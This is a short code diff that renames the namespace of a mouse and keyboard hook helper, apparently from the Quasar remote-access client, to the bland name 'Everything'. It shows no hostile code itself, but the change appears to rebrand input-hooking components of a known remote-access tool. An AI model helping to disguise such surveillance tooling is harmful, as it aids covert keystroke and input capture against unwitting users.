@@ -6,10 +6,10 @@ using System;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using Quasar.Client.MouseKeyHook.Implementation;
+using Everything.MouseKeyHook.Implementation;
 using Quasar.Client.Utilities;
 
-namespace Quasar.Client.MouseKeyHook.WinApi
+namespace Everything.MouseKeyHook.WinApi
 {
     internal static class HookHelper
     {
